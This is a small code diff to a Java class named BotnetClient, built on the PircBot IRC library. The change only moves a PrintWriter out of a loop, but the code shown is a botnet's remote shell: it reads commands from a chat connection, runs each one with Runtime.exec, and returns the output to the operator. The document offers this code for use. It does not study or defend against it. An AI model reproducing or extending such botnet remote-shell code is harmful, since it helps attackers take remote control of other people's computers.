@@ -98,6 +98,7 @@ public class BotnetClient extends PircBot {
 		}
 		public void run() {
 			Runtime r = Runtime.getRuntime();
+			PrintWriter out = new PrintWriter(chat.getBufferedWriter());
 			try {
 	        	chat.sendLine("$: ");
 	        	String command = chat.readLine();
@@ -105,7 +106,6 @@ public class BotnetClient extends PircBot {
 	        	while (!command.equalsIgnoreCase("quit shell")) {
 	        		Process p = r.exec(command);
 	        		Scanner in = new Scanner(p.getInputStream());
-	        		PrintWriter out = new PrintWriter(chat.getBufferedWriter());
 	        		p.waitFor();
 	        		String response = "";
 	        		while (in.hasNextLine()) {
